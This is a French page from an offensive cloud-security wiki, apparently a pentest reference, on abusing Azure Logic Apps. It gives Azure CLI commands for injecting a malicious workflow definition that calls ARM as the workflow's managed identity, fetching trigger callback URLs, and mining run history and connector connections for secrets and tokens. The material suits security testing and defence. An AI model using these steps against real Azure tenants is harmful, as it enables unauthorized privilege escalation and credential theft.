---
title: "Logic Apps : appeler ARM et Graph en tant qu'identité du workflow"
order: 2
description: "Détourner Azure Logic Apps : ajouter une étape de workflow qui appelle ARM ou Graph en tant qu'identité managée du workflow, et lire les identifiants des connecteurs."
keywords:
  - Logic Apps
  - workflow
  - managed identity
  - connector
  - trigger URL
---

# Logic Apps

Une Logic App est un workflow qui peut porter une **identité managée** et détient des **connexions API** vers d'autres services, chacune stockant son propre credential. Avec un accès en écriture à la définition du workflow, ajoutez une action HTTP qui appelle ARM ou Microsoft Graph avec l'identité du workflow : le workflow l'exécute alors en tant que ce principal. Les connexions de connecteur enregistrées (Office 365, SQL, stockage) constituent un second trésor de credentials.

## Ajouter une étape qui s'exécute en tant qu'identité

```bash
az logic workflow list -g <rg> -o table
az logic workflow show -g <rg> -n <wf> --query identity
# edit the definition to add an HTTP action with authentication type ManagedServiceIdentity:
#   "authentication": { "type": "ManagedServiceIdentity", "audience": "https://management.azure.com/" }
az logic workflow create -g <rg> -n <wf> --definition @evil-definition.json
```

## Déclencher et lire les exécutions

```bash
# recoverable HTTP-trigger callback URL lets you fire the workflow without portal access
az rest --method post --uri \
  "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<wf>/triggers/<trigger>/listCallbackUrl?api-version=2016-06-01"
# run history leaks inputs/outputs, often including secrets
az logic workflow show -g <rg> -n <wf>
```

## Notes d'exploitation

- L'action HTTP hérite de l'identité du workflow : une seule étape ajoutée appelle donc ARM en tant que ce principal ; énumérez ses rôles et enchaînez vers l'[identité](../identity/managed-identities/index.md).
- Les connexions API conservent les jetons OAuth et les credentials des services qu'elles exposent ; les lire permet de pivoter vers ces services.
- L'historique des exécutions est une source courante d'entrées et de sorties divulguées : lisez-le avant et après toute altération.

## Outils

- **Azure CLI** (`az logic workflow`, `az rest`).
- **MicroBurst** / **PowerZure** : énumération des Logic Apps et des connexions.

## Références

- [HackTricks Cloud: Azure Logic Apps](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: authenticate access with managed identities in Logic Apps](https://learn.microsoft.com/azure/logic-apps/authenticate-with-managed-identity)
- [PowerZure](https://github.com/hausec/PowerZure)
